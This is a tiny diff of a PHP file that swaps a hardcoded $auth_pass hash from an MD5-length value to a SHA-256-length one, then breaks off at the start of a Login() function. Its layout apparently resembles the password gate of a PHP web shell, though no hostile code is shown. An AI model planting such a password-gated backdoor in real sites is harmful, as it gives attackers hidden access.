@@ -1,5 +1,5 @@
 <?php
-$auth_pass = "f929188391585db2451ddaa23e827fd9";
+$auth_pass = "55acb1a24ba21bec46490e76fe72a35da955b90d2b838c17c8e5b5166a3ce8b7";
 
 function Login() {
     die("<html>
